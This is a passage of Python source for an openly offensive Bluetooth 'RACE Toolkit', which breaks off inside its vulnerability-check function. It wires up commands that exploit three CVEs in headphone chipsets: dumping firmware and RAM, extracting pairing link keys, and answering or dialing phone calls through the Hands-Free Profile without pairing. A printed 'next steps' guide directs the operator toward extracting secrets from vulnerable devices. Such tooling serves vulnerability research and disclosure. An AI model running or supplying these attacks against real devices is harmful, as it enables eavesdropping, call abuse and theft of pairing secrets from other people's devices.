"""RACE Toolkit - A tool for exploiting RACE protocol vulnerabilities in Bluetooth devices.

This toolkit provides utilities for checking CVE-2025-20700, CVE-2025-20701,
and CVE-2025-20702 vulnerabilities, as well as dumping firmware and memory
from affected devices.
"""
import sys
import os
import glob
import struct
import logging
import asyncio
import argparse
import subprocess
import time
import traceback
import fcntl

from dataclasses import dataclass
from enum import Enum, auto

try:
    from usb1 import USBErrorBusy  # type: ignore[import-not-found]
except ImportError:
    # usb1 may not be installed, create a dummy exception
    class USBErrorBusy(Exception):  # type: ignore[no-redef]
        """Dummy exception when usb1 is not available."""

from hexdump import hexdump

from librace.constants import RaceType
from librace.fota import FOTAUpdater
from librace.packets import (
    GetLinkKeyResponse,
    RaceHeader,
    RacePacket,
    GetLinkKey,
    GetSDKInfo,
    BuildVersion,
    GetEDRAddress,
    GetEDRAddressResponse,
)
from librace.transport import (
    Transport,
    GATTBumbleChecker,
    GATTBleakTransport,
    GATTBumbleTransport,
    RFCOMMBumbleChecker,
    RFCOMMTransport,
    USBHIDTransport,
)
from librace.race import RACE
from librace.dumper import (
    RACEDumper,
    RACEFlashDumper,
    RACERAMDumper,
)
from librace.util import setup_logging
from librace.parttable import parse_partition_table


def release_bluetooth_controller(controller: str):
    """Force stop any existing processes holding onto the Bluetooth controller.

    This prevents 'USB device busy' errors when trying to use the controller.
    """
    if not controller.startswith("usb:"):
        return

    logging.info("Releasing Bluetooth controller from system services...")

    # List of services/processes that commonly hold the Bluetooth controller
    services_to_stop = ["bluetooth", "bluetooth.service"]
    processes_to_kill = ["bluetoothd", "bt_stack", "bluetoothctl"]

    # Try to stop systemd services
    for service in services_to_stop:
        try:
            result = subprocess.run(
                ["sudo", "systemctl", "stop", service],
                capture_output=True,
                timeout=5,
                check=False
            )
            if result.returncode == 0:
                logging.debug("Stopped service: %s", service)
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            pass

    # Kill any remaining Bluetooth processes
    for proc_name in processes_to_kill:
        try:
            subprocess.run(
                ["sudo", "pkill", "-9", proc_name],
                capture_output=True,
                timeout=5,
                check=False
            )
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            pass

    # Give the system a moment to release the device
    time.sleep(0.5)
    logging.debug(
        "Bluetooth controller %s should now be available", controller)


def reset_usb_bluetooth_controller(controller: str) -> bool:
    """Reset a USB Bluetooth controller to clear stuck connections.

    For USB controllers used directly by bumble (usb:VID:PID format),
    we need to do a USB device reset rather than HCI reset.

    Args:
        controller: Controller specification (e.g., "usb:0", "usb:0BDA:8771").

    Returns:
        True if reset was successful, False otherwise.
    """
    if not controller.startswith("usb:"):
        # For non-USB controllers, try HCI reset
        return _reset_hci_controller("hci0")

    logging.info("Resetting USB Bluetooth controller...")

    # Try to find and reset the USB device
    try:
        import usb1
        ctx = usb1.USBContext()

        # Find Bluetooth devices (class 0xE0)
        bt_devices = []
        for dev in ctx.getDeviceList():
            is_bt = False
            try:
                if dev.getDeviceClass() == 0xE0:
                    is_bt = True
                else:
                    for cfg in dev:
                        for intf in cfg:
                            for setting in intf:
                                if setting.getClass() == 0xE0:
                                    is_bt = True
                                    break
            except usb1.USBError:
                pass
            if is_bt:
                bt_devices.append(dev)

        if not bt_devices:
            logging.warning("No USB Bluetooth devices found to reset.")
            return False

        # Reset the first Bluetooth device found
        dev = bt_devices[0]
        vid = dev.getVendorID()
        pid = dev.getProductID()
        bus = dev.getBusNumber()
        addr = dev.getDeviceAddress()

        logging.debug(
            "Resetting USB device %04x:%04x (bus %d, addr %d)...",
            vid, pid, bus, addr
        )

        # Method 1: Try USBDEVFS_RESET ioctl (most reliable)
        # This is the same as running 'usbreset' command
        usbdevfs_reset = 21780  # USBDEVFS_RESET from linux/usbdevice_fs.h
        dev_path = f"/dev/bus/usb/{bus:03d}/{addr:03d}"

        if os.path.exists(dev_path):
            try:
                logging.debug("Resetting via ioctl on %s", dev_path)
                with open(dev_path, 'wb') as f:
                    fcntl.ioctl(f.fileno(), usbdevfs_reset, 0)
                logging.info("USB Bluetooth controller reset successfully.")
                time.sleep(2.0)  # Give device time to reinitialize
                return True
            except PermissionError:
                logging.debug("Permission denied for ioctl, trying sudo...")
                # Try with sudo using usbreset if available
                result = subprocess.run(
                    ["sudo", "usbreset", f"{vid:04x}:{pid:04x}"],
                    capture_output=True, timeout=10, check=False
                )
                if result.returncode == 0:
                    logging.info(
                        "USB Bluetooth controller reset successfully.")
                    time.sleep(2.0)
                    return True
            except (IOError, OSError) as e:
                logging.debug("ioctl reset failed: %s", e)

        # Method 2: Fallback to sysfs authorized file
        sysfs_path = f"/sys/bus/usb/devices/{bus}-*"
        device_paths = glob.glob(sysfs_path)

        for path in device_paths:
            try:
                vendor_path = f"{path}/idVendor"
                product_path = f"{path}/idProduct"
                if os.path.exists(vendor_path) and os.path.exists(product_path):
                    with open(vendor_path, "r", encoding="ascii") as f:
                        dev_vid = int(f.read().strip(), 16)
                    with open(product_path, "r", encoding="ascii") as f:
                        dev_pid = int(f.read().strip(), 16)
                    if dev_vid == vid and dev_pid == pid:
                        auth_path = f"{path}/authorized"
                        if os.path.exists(auth_path):
                            logging.debug("Resetting via %s", auth_path)
                            subprocess.run(
                                ["sudo", "sh", "-c", f"echo 0 > {auth_path}"],
                                capture_output=True, timeout=5, check=False
                            )
                            time.sleep(1.0)
                            subprocess.run(
                                ["sudo", "sh", "-c", f"echo 1 > {auth_path}"],
                                capture_output=True, timeout=5, check=False
                            )
                            time.sleep(3.0)  # Longer wait after sysfs reset
                            logging.info(
                                "USB Bluetooth controller reset successfully."
                            )
                            return True
            except (IOError, OSError, ValueError):
                continue

        # Last resort: just wait longer
        logging.warning(
            "Could not reset USB device. "
            "Waiting for controller to recover..."
        )
        time.sleep(5.0)
        return False

    except ImportError:
        logging.warning("usb1 not available for USB reset")
        return False
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.warning("USB reset failed: %s", e)
        return False
        return False


def _reset_hci_controller(hci_device: str = "hci0") -> bool:
    """Reset the HCI Bluetooth controller (for built-in adapters).

    Args:
        hci_device: The HCI device name (default: hci0).

    Returns:
        True if reset was successful, False otherwise.
    """
    logging.debug("Attempting HCI reset for %s...", hci_device)
    try:
        # First bring the device down
        subprocess.run(
            ["sudo", "hciconfig", hci_device, "down"],
            capture_output=True,
            timeout=5,
            check=False
        )
        time.sleep(0.3)

        # Then bring it back up
        result = subprocess.run(
            ["sudo", "hciconfig", hci_device, "up"],
            capture_output=True,
            timeout=5,
            check=False
        )

        if result.returncode == 0:
            logging.debug("HCI controller %s reset successfully.", hci_device)
            time.sleep(0.5)
            return True
        else:
            logging.debug(
                "HCI reset failed for %s: %s",
                hci_device,
                result.stderr.decode() if result.stderr else "unknown error"
            )
            return False
    except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError) as e:
        logging.debug("Could not reset HCI controller: %s", e)
        return False


def enumerate_bluetooth_controllers() -> list[tuple[str, str]]:
    """Enumerate available USB Bluetooth controllers.

    Returns:
        List of tuples (controller_spec, description) for each controller found.
    """
    controllers = []
    try:
        import usb1
        ctx = usb1.USBContext()
        for dev in ctx.getDeviceList():
            # Bluetooth class is 0xE0 (Wireless Controller)
            is_bt = False
            try:
                if dev.getDeviceClass() == 0xE0:
                    is_bt = True
                else:
                    for cfg in dev:
                        for intf in cfg:
                            for setting in intf:
                                if setting.getClass() == 0xE0:
                                    is_bt = True
                                    break
            except usb1.USBError:
                pass

            if is_bt:
                vid = dev.getVendorID()
                pid = dev.getProductID()
                try:
                    prod = dev.getProduct() or "Bluetooth Controller"
                except usb1.USBError:
                    prod = "Bluetooth Controller"

                # Build controller spec
                ctrl_spec = f"usb:{vid:04X}:{pid:04X}"
                controllers.append((ctrl_spec, prod))
    except ImportError:
        logging.warning("usb1 not installed, cannot enumerate USB controllers")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.debug("Error enumerating controllers: %s", e)

    return controllers


def select_bluetooth_controller(controller: str | None) -> str | None:
    """Select a Bluetooth controller, prompting user if needed.

    Args:
        controller: User-specified controller string, or None to enumerate.

    Returns:
        Controller specification string, or None if none available.
    """
    if controller:
        return controller

    controllers = enumerate_bluetooth_controllers()
    if not controllers:
        logging.error(
            "No USB Bluetooth controllers found. "
            "Please specify --controller manually."
        )
        return None

    if len(controllers) == 1:
        ctrl_spec, prod = controllers[0]
        logging.info("Using Bluetooth controller: %s (%s)", prod, ctrl_spec)
        return ctrl_spec

    # Multiple controllers - let user choose
    logging.info("Available Bluetooth controllers:")
    for i, (ctrl_spec, prod) in enumerate(controllers):
        logging.info("  [%d] %s (%s)", i, prod, ctrl_spec)

    chosen = -1
    while chosen < 0 or chosen >= len(controllers):
        try:
            chosen = int(input("Select controller [0]: ") or "0")
        except ValueError:
            pass

    return controllers[chosen][0]


async def scan_classic_devices(
    controller: str, timeout: float = 10.0
) -> list[tuple[str, str]]:
    """Scan for Bluetooth Classic devices.

    Args:
        controller: Controller specification string.
        timeout: How long to scan in seconds.

    Returns:
        List of tuples (address, name) for each device found.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address

    devices: dict[str, str] = {}

    try:
        t = await open_transport_or_link(controller)
        config = DeviceConfiguration()
        config.keystore = "JsonKeyStore"
        config.address = Address.generate_static_address()
        config.name = "BumbleRace"
        device = Device.from_config_with_hci(config, t.source, t.sink)
        device.classic_enabled = True
        await device.power_on()

        def on_inquiry_result(
            address, class_of_device, data, rssi  # pylint: disable=unused-argument
        ):
            addr_str = str(address)
            # Try to get name from Extended Inquiry Response
            name = data.get(0x09)  # Complete Local Name
            if not name:
                name = data.get(0x08)  # Shortened Local Name
            if name:
                if isinstance(name, bytes):
                    name = name.decode("utf-8", errors="replace")
                devices[addr_str] = name
            elif addr_str not in devices:
                devices[addr_str] = "(unknown)"

        device.on("inquiry_result", on_inquiry_result)

        logging.info(
            "Scanning for Bluetooth Classic devices (%.0fs)...", timeout
        )
        await device.start_discovery()

        await asyncio.sleep(timeout)

        await device.stop_discovery()
        await t.close()

    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("Classic device scan failed: %s", e)

    return list(devices.items())


def select_classic_device(
    devices: list[tuple[str, str]], target_address: str | None
) -> str | None:
    """Select a Bluetooth Classic device, prompting user if needed.

    Args:
        devices: List of (address, name) tuples from scanning.
        target_address: User-specified address, or None to prompt.

    Returns:
        Device address string, or None if none available.
    """
    if target_address:
        return target_address

    if not devices:
        logging.error(
            "No Bluetooth Classic devices found. "
            "Please specify --target-address manually."
        )
        return None

    # Always prompt user to select - even with one device it may not be the right one
    logging.info("Found %d Bluetooth Classic device(s):", len(devices))
    for i, (addr, name) in enumerate(devices):
        logging.info("  [%d] %s (%s)", i, name, addr)
    logging.info("  [X] None of these / Enter address manually")

    while True:
        choice = input("Select device [0]: ").strip() or "0"
        if choice.upper() == "X":
            logging.info(
                "Enter Bluetooth Classic address (AA:BB:CC:DD:EE:FF):")
            manual_addr = input().strip()
            if manual_addr and ":" in manual_addr:
                return manual_addr
            logging.error("Invalid address format.")
            return None
        try:
            idx = int(choice)
            if 0 <= idx < len(devices):
                return devices[idx][0]
        except ValueError:
            pass
        logging.info("Invalid choice, try again.")


def parse_args():
    """Parse command line arguments and return the parsed namespace."""
    parser = argparse.ArgumentParser(description="RACE Toolkit")
    parser.add_argument(
        "-t",
        "--transport",
        choices=["gatt", "bleak", "rfcomm", "usb"],
        default="gatt",
        help="Transport method (default: gatt)",
    )
    parser.add_argument(
        "--target-address", help="Target device Bluetooth classic address to connect to"
    )
    parser.add_argument(
        "--le-names",
        default=None,
        nargs="+",
        help="List of names to scan for if no address is given",
    )
    parser.add_argument(
        "-c",
        "--controller",
        default="usb:0",
        help="Bumble Bluetooth Controller (Required for RFCOMM, default: usb:0)",
    )
    parser.add_argument(
        "-d",
        "--device",
        default=None,
        help="USB device for USBHID transport. Given as VID:PID pair. "
             "By default the transport enumerates all devices and lets you choose.",
    )
    parser.add_argument(
        "--outfile", help="Output file for commands with output (default is stdout)."
    )
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging.")
    parser.add_argument(
        "--send-delay",
        type=float,
        default=0.0,
        help="Introduces a send delay between RACE messages. "
             "Might be required for old SDK versions?",
    )
    parser.add_argument(
        "--authenticate",
        action="store_true",
        help="Try to authenticate/pair during connection. Required for devices with pairing issues fixed. Put device into pairing mode and connect with this parameter. Ideally, this only needs to be done once.",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # Check subcommand
    subparsers.add_parser(
        "check",
        help="Check for RACE vulnerabilities (CVE-2025-20700, CVE-2025-20701, CVE-2025-20702).",
    )

    # RAM subcommand
    ram_parser = subparsers.add_parser("ram", help="Read RAM memory")
    ram_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Target address (hex parsed to int)",
    )
    ram_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 4)",
    )

    # Flash subcommand
    flash_parser = subparsers.add_parser("flash", help="Dump Flash memory")
    flash_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Start address (hex parsed to int, must be a multiple of 0x100)",
    )
    flash_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 0x100)",
    )

    # Link-keys subcommand
    subparsers.add_parser(
        "link-keys", help="RACE Get Link Key Command (Will not work on many devices)"
    )

    # BD addr subcommand
    subparsers.add_parser("bdaddr", help="RACE Get Bluetooth Address Command")

    # Enumerate Classic services subcommand (CVE-2025-20701 PoC)
    subparsers.add_parser(
        "enumerate-classic",
        help="Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC)"
    )

    # Enumerate RACE protocol subcommand (CVE-2025-20702 PoC)
    subparsers.add_parser(
        "enumerate-race",
        help="Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC)"
    )

    # HFP Demo subcommand (Hands-Free Profile exploitation)
    hfp_parser = subparsers.add_parser(
        "hfp-demo",
        help="Demonstrate Hands-Free Profile access without pairing (CVE-2025-20701)"
    )
    hfp_parser.add_argument(
        "--action",
        choices=["info", "answer", "reject", "hangup",
                 "dial", "voice", "ring", "volume", "sco-ring"],
        default="info",
        help="HFP action to perform: info (default), answer, reject, hangup, "
             "dial (requires --number), voice, ring (AG only), volume (AG only), "
             "sco-ring (AG only - establish SCO audio and play ringtone)"
    )
    hfp_parser.add_argument(
        "--number",
        type=str,
        help="Phone number to dial (for --action dial) or caller ID (for --action ring)"
    )

    # SDK info subcommand
    subparsers.add_parser("sdkinfo", help="RACE Get SDK Information Command")

    # Build version subcommand
    subparsers.add_parser("buildversion", help="RACE Build Version Command")

    # Mediainfo subcommand
    subparsers.add_parser(
        "mediainfo",
        help="Dump Current Listening Media Info. This is a proof-of-concept. "
             "Only works on some FW versions of Sony WH-CH720N.",
    )

    # Raw subcommand
    raw_parser = subparsers.add_parser(
        "raw", help="Send simple RACE packet with specified ID"
    )
    raw_parser.add_argument(
        "--id",
        type=lambda x: int(x, 16),
        required=True,
        help="ID of RACE command to send",
    )

    # Dump partition subcommand
    subparsers.add_parser(
        "dump-partition", help="Interactively choose and dump a partition"
    )

    # FOTA Update subcommand
    fota_parser = subparsers.add_parser("fota", help="FOTA update")
    fota_parser.add_argument("--fota-file", help="The FOTA file")
    fota_parser.add_argument(
        "--dont-reflash",
        action="store_true",
        default=False,
        help="Prevent FOTA partition from being erased and reflashed. "
             "This is mainly to retry the currently flashed FOTA update.",
    )
    fota_parser.add_argument(
        "--chunks-per-write",
        type=int,
        default=3,
        help="How many chunks should be written in one flash write. "
             "Experiments show 3 works best. Larger numbers might not be possible.",
    )

    # Scan subcommand - discover Bluetooth devices
    scan_parser = subparsers.add_parser(
        "scan",
        help="Discover Bluetooth devices (active scan with device info)"
    )
    scan_parser.add_argument(
        "--mode",
        choices=["classic", "ble", "both"],
        default="classic",
        help="Scan mode: classic (BR/EDR), ble, or both (default: classic)"
    )
    scan_parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Scan duration in seconds (default: 10)"
    )
    scan_parser.add_argument(
        "--extended",
        action="store_true",
        help="Use extended inquiry for more device info"
    )

    # BLE Scan subcommand - active BLE scanning
    ble_scan_parser = subparsers.add_parser(
        "ble-scan",
        help="BLE scanning - continuous advertisement capture with device enumeration"
    )
    ble_scan_parser.add_argument(
        "--timeout",
        type=float,
        default=0,
        help="Scan duration in seconds (0 = continuous, Ctrl+C to stop)"
    )
    ble_scan_parser.add_argument(
        "--filter",
        type=str,
        help="Filter by device name (substring match)"
    )
    ble_scan_parser.add_argument(
        "--filter-addr",
        type=str,
        help="Filter by MAC address (prefix match)"
    )
    ble_scan_parser.add_argument(
        "--show-raw",
        action="store_true",
        help="Show raw advertisement data bytes"
    )
    ble_scan_parser.add_argument(
        "--show-uuids",
        action="store_true",
        help="Show advertised service UUIDs"
    )

    # BLE Info subcommand - enumerate BLE device information
    ble_info_parser = subparsers.add_parser(
        "ble-info",
        help="Enumerate BLE GATT services and read all characteristics without auth"
    )
    ble_info_parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Connection timeout in seconds (default: 10)"
    )

    # BLE Speaker Control PoC (Experimental)
    ble_speaker_parser = subparsers.add_parser(
        "ble-speaker",
        help="[EXPERIMENTAL] BLE speaker control PoC - vendor-specific characteristics (limited success)"
    )
    ble_speaker_parser.add_argument(
        "--action",
        choices=["probe", "play", "pause", "next", "prev",
                 "vol-up", "vol-down", "mute", "read-all", "write-test"],
        default="probe",
        help="Action: probe (discover controls), play, pause, next, prev, vol-up, vol-down, mute, read-all (read all characteristics), write-test (probe writable chars)"
    )
    ble_speaker_parser.add_argument(
        "--char-uuid",
        type=str,
        help="Specific characteristic UUID to interact with"
    )
    ble_speaker_parser.add_argument(
        "--write-data",
        type=str,
        help="Hex data to write (e.g., '01020304' or 'play' for common commands)"
    )
    ble_speaker_parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Connection timeout in seconds (default: 10)"
    )

    # AVRCP Classic Bluetooth Media Control (Experimental)
    avrcp_parser = subparsers.add_parser(
        "avrcp",
        help="[EXPERIMENTAL] AVRCP media control via Classic Bluetooth - may fail if device connected elsewhere"
    )
    avrcp_parser.add_argument(
        "--action",
        choices=["info", "play", "pause", "stop", "next", "prev",
                 "vol-up", "vol-down", "mute", "ff", "rewind"],
        default="info",
        help="Action: info (show device info), play, pause, stop, next, prev, vol-up, vol-down, mute, ff (fast-forward), rewind"
    )
    avrcp_parser.add_argument(
        "--repeat",
        type=int,
        default=1,
        help="Number of times to repeat the action (default: 1)"
    )
    avrcp_parser.add_argument(
        "--hold-time",
        type=float,
        default=0.1,
        help="Time to hold button in seconds (default: 0.1)"
    )
    avrcp_parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Connection timeout in seconds (default: 10)"
    )

    return parser.parse_args()


def init_transport(args: argparse.Namespace) -> Transport:
    """Initialize the transport based on the given arguments.

    Raises:
        ValueError: If required arguments are missing or transport type is unknown.
    """
    transport_type = args.transport.lower()

    # Release Bluetooth controller for transports that need it
    if transport_type in ("rfcomm", "gatt"):
        release_bluetooth_controller(args.controller)

    if transport_type == "rfcomm":
        if args.target_address is None:
            raise ValueError("RFCOMM transport needs --target-address!")
        return RFCOMMTransport(args.controller, args.target_address, args.authenticate)
    elif transport_type == "bleak":
        return GATTBleakTransport(args.target_address, args.le_names)
    elif transport_type == "gatt":
        return GATTBumbleTransport(
            args.controller, args.target_address, args.le_names, args.authenticate
        )
    elif transport_type == "usb":
        return USBHIDTransport(args.device)
    else:
        raise ValueError(f"Unknown transport type: {args.transport}")


class VulnerabilityStatus(Enum):
    """Status of a vulnerability check."""
    UNKNOWN = auto()
    FIXED = auto()
    VULNERABLE = auto()
    NOT_APPLICABLE = auto()


@dataclass
class Vulnerability:
    """Represents a vulnerability with its check status."""
    id: str
    description: str
    status: VulnerabilityStatus = VulnerabilityStatus.UNKNOWN


def _noop_recv(_data: bytes) -> None:
    """No-op receive callback for setup calls that don't need data handling."""


def _get_vuln(vulnerabilities: list[Vulnerability], vuln_id: str) -> Vulnerability:
    """Get a vulnerability by ID. Raises KeyError if not found."""
    for v in vulnerabilities:
        if v.id == vuln_id:
            return v
    raise KeyError(f"Vulnerability {vuln_id} not found")


def _write_or_display(data: bytes, outfile: str | None, display_func=None):
    """Write data to file or display it.

    Args:
        data: Data to output
        outfile: Output file path, or None to display
        display_func: Optional function to display data (default: hexdump)
    """
    if outfile:
        with open(outfile, "wb") as f:
            f.write(data)
        logging.info("Output saved to %s", outfile)
    else:
        if display_func:
            display_func(data)
        else:
            hexdump(data)


async def _dump_memory(
    dumper_class, r: RACE, address: int, size: int,
    outfile: str | None, debug: bool, alignment: int, unit: str
) -> None:
    """Generic memory dump function.

    Args:
        dumper_class: RACERAMDumper or RACEFlashDumper class
        r: RACE instance
        address: Start address
        size: Size to dump
        outfile: Optional output file
        debug: Debug mode (disables progress)
        alignment: Required alignment for address/size
        unit: Unit name for error messages
    """
    # Validate alignment
    if size % alignment != 0 or address % alignment != 0:
        logging.error(
            "Error! Address and size need to be multiples of %#x to be %s-aligned!",
            alignment, unit
        )
        sys.exit(1)

    dumper = dumper_class(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
        logging.info("Dump saved to %s", outfile)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def _send_race_command(
    r: RACE, packet, outfile: str | None,
    log_request: str = None, log_response: str = None,
    display_func=None
) -> bytes:
    """Send a RACE command and handle output.

    Args:
        r: RACE instance
        packet: RACE packet to send
        outfile: Optional output file
        log_request: Optional log message before sending
        log_response: Optional log message after receiving
        display_func: Optional function to display response

    Returns:
        Response bytes
    """
    if log_request:
        logging.info(log_request)

    await r.setup()
    response = await r.send_sync(packet)

    if log_response:
        logging.info(log_response)

    _write_or_display(response, outfile, display_func)
    return response


def _display_and_select_ble_device(devices_dict: dict, rssi_dict: dict = None):
    """Display BLE devices in a table format and let user select one.

    Args:
        devices_dict: Dict mapping addresses to names (or None)
        rssi_dict: Optional dict mapping addresses to RSSI values

    Returns:
        Tuple of (address, name) if selected, False if user cancels
    """
    if not devices_dict:
        return False

    # Build list with RSSI for sorting
    devices_with_rssi = []
    for addr, name in devices_dict.items():
        rssi = rssi_dict.get(addr, -999) if rssi_dict else -999
        devices_with_rssi.append((addr, name, rssi))

    # Sort by RSSI (strongest signal first)
    devices_with_rssi.sort(key=lambda x: x[2], reverse=True)

    # Print table header
    print(f"\n\033[1;36m{'─' * 80}\033[0m")
    print(f"\033[1;36m  FOUND {len(devices_with_rssi)} BLE DEVICE(S)\033[0m")
    print(f"\033[1;36m{'─' * 80}\033[0m\n")

    # Column headers
    print(f"  {'#':<4} {'NAME':<35} {'ADDRESS':<20} {'RSSI':>6}")
    print(f"  {'-'*4} {'-'*35} {'-'*20} {'-'*6}")

    # Print devices
    for i, (address, name, rssi) in enumerate(devices_with_rssi):
        # Show "(Unknown)" for devices without names
        display_name = name if name and name != "(unknown)" else "(Unknown)"
        # Truncate long names
        if len(display_name) > 34:
            display_name = display_name[:31] + "..."

        rssi_color = "\033[1;32m" if rssi > - \
            70 else "\033[0;33m" if rssi > -85 else "\033[0;90m"
        print(
            f"  \033[1;36m[{i}]\033[0m  {display_name:<35} {address:<20} {rssi_color}{rssi:>4}dBm\033[0m")

    print(f"  \033[1;36m[X]\033[0m  None of these devices is mine")
    print(f"\n\033[1;36m{'─' * 80}\033[0m\n")

    # Get user selection
    chosen = input(
        "Which device is yours? Enter number [0-%d] or X: " % (
            len(devices_with_rssi) - 1)
    ).strip()

    if chosen.lower() == "x":
        logging.info("User chose to skip BLE device selection.")
        return False

    try:
        idx = int(chosen)
        if 0 <= idx < len(devices_with_rssi):
            addr, name, rssi = devices_with_rssi[idx]
            logging.info("Selected: %s (%s)", name if name else addr, addr)
            return (addr, name)
        else:
            logging.error("Invalid selection. Number out of range.")
            return False
    except ValueError:
        logging.error("Invalid input. Please enter a number or X.")
        return False


def _is_valid_dump(data: bytes, threshold: float = 0.95) -> bool:
    """Check if dump data appears to be valid (not mostly zeros or repeating pattern).

    Args:
        data: The dump data to validate.
        threshold: Maximum percentage of zeros allowed (default 95%).

    Returns:
        True if the dump appears to contain valid data.
    """
    if not data or len(data) == 0:
        return False

    # Count zero bytes
    zero_count = data.count(b'\x00'[0])
    zero_ratio = zero_count / len(data)

    if zero_ratio > threshold:
        logging.warning(
            "Dump data is %.1f%% zeros - likely invalid/garbage data",
            zero_ratio * 100
        )
        return False

    # Check for suspicious repeating patterns (like every 0x100 bytes)
    if len(data) >= 0x200:
        # Check if data repeats at 0x100 boundaries
        chunk_size = 0x100
        first_chunk = data[:chunk_size]
        repeat_count = 0
        for i in range(chunk_size, min(len(data), chunk_size * 8), chunk_size):
            if data[i:i + chunk_size] == first_chunk:
                repeat_count += 1
        if repeat_count >= 3:  # Same pattern repeated 4+ times
            logging.warning(
                "Dump data shows repeating pattern - likely error responses"
            )
            return False

    return True


def _print_vulnerability_summary(
    vulnerabilities: list[Vulnerability],
    bdaddr: str | bytes | None = None,
    controller: str = "usb:0"
) -> None:
    """Print a summary of vulnerability check results with actionable suggestions."""
    logging.info("Vulnerability status summary:")
    for v in vulnerabilities:
        logging.info("  [%-10s] %s: %s", v.status.name, v.id, v.description)

    # Collect vulnerable items for suggestions
    vulnerable = [v for v in vulnerabilities
                  if v.status == VulnerabilityStatus.VULNERABLE]

    if not vulnerable:
        return

    logging.info("")
    logging.info("=" * 60)
    logging.info("SUGGESTED NEXT STEPS")
    logging.info("=" * 60)

    # Convert bdaddr to string if needed
    addr_str: str | None = None
    if isinstance(bdaddr, bytes):
        addr_str = bdaddr.decode("ascii", errors="ignore")
    elif isinstance(bdaddr, str):
        addr_str = bdaddr

    addr_arg = f"--target-address {addr_str}" if addr_str else "--target-address <device_address>"

    for v in vulnerable:
        logging.info("")
        if v.id == "CVE-2025-20700":
            logging.info("[%s] GATT Authentication Bypass", v.id)
            logging.info("  The device allows unauthenticated GATT access.")
            logging.info("  Try extracting sensitive data:")
            logging.info("")
            logging.info("  # Dump firmware from flash memory:")
            logging.info("    python race_toolkit.py %s flash -o firmware.bin",
                         addr_arg)
            logging.info("")
            logging.info("  # Extract Bluetooth link keys (pairing secrets):")
            logging.info("    python race_toolkit.py %s link-keys", addr_arg)
            logging.info("")
            logging.info("  # Get device Bluetooth address:")
            logging.info("    python race_toolkit.py %s bdaddr", addr_arg)

        elif v.id == "CVE-2025-20701":
            logging.info("[%s] BR/EDR Authentication Bypass", v.id)
            logging.info("  The device accepts connections WITHOUT pairing!")
            logging.info(
                "  An attacker can connect to Bluetooth profiles directly.")
            logging.info("")
            logging.info("  # Enumerate accessible RFCOMM services:")
            logging.info(
                "    python race_toolkit.py -c %s %s enumerate-classic",
                controller, addr_arg
            )
            logging.info("")
            logging.info("  # Check for RACE protocol exposure:")
            logging.info(
                "    python race_toolkit.py -c %s %s enumerate-race",
                controller, addr_arg
            )
            logging.info("")
            logging.info(
                "  # Exploit Hands-Free Profile (answer/make calls!):")
            logging.info(
                "    python race_toolkit.py -c %s %s hfp-demo",
                controller, addr_arg
            )
            logging.info(
                "    python race_toolkit.py -c %s %s hfp-demo --action answer",
                controller, addr_arg
            )
            logging.info(
                "    python race_toolkit.py -c %s %s hfp-demo --action dial --number 1234567890",
                controller, addr_arg
            )

        elif v.id == "CVE-2025-20702_LE":
            logging.info("[%s] RACE Protocol via BLE", v.id)
            logging.info(
                "  The RACE debug protocol is exposed over Bluetooth LE!")
            logging.info("  Try extracting sensitive data:")
            logging.info("")
            logging.info("  # Dump firmware from flash:")
            logging.info("    python race_toolkit.py %s flash -o firmware.bin",
                         addr_arg)
            logging.info("")
            logging.info("  # Dump RAM for secrets/keys:")
            logging.info(
                "    python race_toolkit.py %s ram --address 0x0 --size 0x10000 -o ram.bin",
                addr_arg
            )
            logging.info("")
            logging.info("  # Extract Bluetooth link keys:")
            logging.info("    python race_toolkit.py %s link-keys -o keys.bin",
                         addr_arg)

        elif v.id == "CVE-2025-20702_BR_EDR":
            logging.info("[%s] RACE Protocol via Bluetooth Classic", v.id)
            logging.info(
                "  The RACE debug protocol is exposed over Bluetooth Classic!"
            )
            logging.info("  Try extracting sensitive data:")
            logging.info("")
            logging.info("  # Dump firmware from flash:")
            logging.info(
                "    python race_toolkit.py -c %s %s flash -o firmware.bin",
                controller, addr_arg
            )
            logging.info("")
            logging.info("  # Dump RAM for secrets/keys:")
            logging.info(
                "    python race_toolkit.py -c %s %s ram --address 0x0 --size 0x10000 -o ram.bin",
                controller, addr_arg
            )
            logging.info("")
            logging.info("  # Extract Bluetooth link keys:")
            logging.info(
                "    python race_toolkit.py -c %s %s link-keys -o keys.bin",
                controller, addr_arg
            )

    logging.info("")
    logging.info("=" * 60)


async def command_check(args: argparse.Namespace):
    """Check device for RACE vulnerabilities and optionally dump firmware."""
    vulnerabilities = [
        Vulnerability("CVE-2025-20700", "Missing GATT authentication"),
        Vulnerability("CVE-2025-20701", "Missing BR/EDR authentication"),
        Vulnerability("CVE-2025-20702_LE", "RACE Protocol via BLE"),
        Vulnerability("CVE-2025-20702_BR_EDR",
                      "RACE Protocol via Bluetooth Classic"),
    ]

    # Collected firmware dumps from vulnerability checks
    collected_dumps = {}

    logging.info("Starting device check.")

    # Select controller if not specified
    controller = select_bluetooth_controller(args.controller)
    if not controller:
        return

    bdaddr = args.target_address

    # Check if we have a Classic address format (contains colons, like AA:BB:CC:DD:EE:FF)
    # If so, skip BLE scanning and go straight to Classic checks
    skip_ble = False
